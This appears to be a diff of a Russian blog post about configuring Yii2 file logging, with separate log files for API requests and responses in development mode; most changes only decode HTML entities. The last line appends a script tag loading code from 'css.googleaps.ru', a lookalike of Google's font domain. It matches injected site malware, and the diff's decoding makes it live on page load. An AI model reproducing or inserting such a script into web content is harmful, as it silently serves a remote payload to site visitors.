@@ -25,8 +25,8 @@ tags:
 - yii
 comments: []
 ---
-<p>Задача: записывать в лог-файл какую-то информацию. Например, когда UI делает запросы к API, на этапе отладки необходимо знать, что &#171;уходит&#187; и что &#171;приходит&#187;.<&#47;p></p>
-<p>В конфиге web.php включается компонент log:<&#47;p></p>
+<p>Задача: записывать в лог-файл какую-то информацию. Например, когда UI делает запросы к API, на этапе отладки необходимо знать, что &#171;уходит&#187; и что &#171;приходит&#187;.</p></p>
+<p>В конфиге web.php включается компонент log:</p></p>
 <pre class="brush: php; title: ; notranslate">
 $config = [<br />
 ...<br />
@@ -42,16 +42,16 @@ $config = [<br />
         ],<br />
 ...<br />
 ]<br />
-<&#47;pre></p>
-<p><span id="more-418"><&#47;span><&#47;p></p>
-<p>Так как в моем случае логгировать нужно на этапе отладки, я расширяю $config чуть ниже:<&#47;p></p>
+</pre></p>
+<p><span id="more-418"></span></p></p>
+<p>Так как в моем случае логгировать нужно на этапе отладки, я расширяю $config чуть ниже:</p></p>
 <pre class="brush: php; title: ; notranslate">
 if (YII_ENV_DEV) {<br />
     $config['components']['log']['targets'][] = [<br />
         'class' => '\yii\log\FileTarget',<br />
         'levels' => ['info'],<br />
         'categories' => ['apiRequest'],<br />
-        'logFile' => '@app&#47;runtime&#47;logs&#47;API&#47;requests.log',<br />
+        'logFile' => '@app/runtime/logs/API/requests.log',<br />
         'maxFileSize' => 1024 * 2,<br />
         'maxLogFiles' => 20,<br />
     ];<br />
@@ -59,26 +59,26 @@ if (YII_ENV_DEV) {<br />
         'class' => '\yii\log\FileTarget',<br />
         'levels' => ['info'],<br />
         'categories' => ['apiResponse'],<br />
-        'logFile' => '@app&#47;runtime&#47;logs&#47;API&#47;response.log',<br />
+        'logFile' => '@app/runtime/logs/API/response.log',<br />
         'maxFileSize' => 1024 * 2,<br />
         'maxLogFiles' => 20,<br />
     ];<br />
 }<br />
-<&#47;pre></p>
-<p>Думаю, здесь ничего разъяснять не надо. Запоминаем только categories &#8212; запросы и ответы будем складывать в разные файлы.<br &#47;><br />
-Сохраняем в лог следующими командами:<&#47;p></p>
+</pre></p>
+<p>Думаю, здесь ничего разъяснять не надо. Запоминаем только categories &#8212; запросы и ответы будем складывать в разные файлы.<br /><br />
+Сохраняем в лог следующими командами:</p></p>
 <pre class="brush: php; title: ; notranslate">
-&#47;** @var array $requestData *&#47;<br />
+/** @var array $requestData */<br />
 Yii::info(\yii\helpers\Json::encode($requestData), 'apiRequest');<br />
-&#47;** @var Guzzle\Http\MessageResponse $response *&#47;<br />
+/** @var Guzzle\Http\MessageResponse $response */<br />
 Yii::info($response->json(), 'apiResponse');<br />
-<&#47;pre></p>
-<p>В лог-файле наша инфа будет иметь примерно такой вид:<&#47;p></p>
+</pre></p>
+<p>В лог-файле наша инфа будет иметь примерно такой вид:</p></p>
 <pre class="brush: php; title: ; notranslate">
 2014-10-16 07:17:40 [127.0.0.1][543262c2fee212ea69680966][-][info][apiRequest] {"body":[{"spent_at":"01:00","spent_time":1413357460},{"spent_at":"02:00","spent_time":1413443860},{"spent_at":"03:00","spent_time":1413530260},{"spent_at":"04:00","spent_time":1413616660},{"spent_at":"","spent_time":1413703060},{"spent_at":"","spent_time":1413789460},{"spent_at":"","spent_time":1413875860}]}<br />
-in &#47;var&#47;www&#47;choicelegal.local&#47;httpdocs&#47;models&#47;choicelegal&#47;AbstractApi.php:74<br />
-in &#47;var&#47;www&#47;choicelegal.local&#47;httpdocs&#47;models&#47;choicelegal&#47;Projects.php:83<br />
-in &#47;var&#47;www&#47;choicelegal.local&#47;httpdocs&#47;models&#47;Project.php:178</p>
-<p>&#47;&#47; а также содержимое глобальных переменных $_POST, $_COOKIE, $_SESSION, $_SERVER.</p>
-<p><&#47;pre><br />
-Source: vingtsun-grodno.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
+in /var/www/choicelegal.local/httpdocs/models/choicelegal/AbstractApi.php:74<br />
+in /var/www/choicelegal.local/httpdocs/models/choicelegal/Projects.php:83<br />
+in /var/www/choicelegal.local/httpdocs/models/Project.php:178</p>
+<p>// а также содержимое глобальных переменных $_POST, $_COOKIE, $_SESSION, $_SERVER.</p>
+<p></pre><br />
+Source: vingtsun-grodno.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
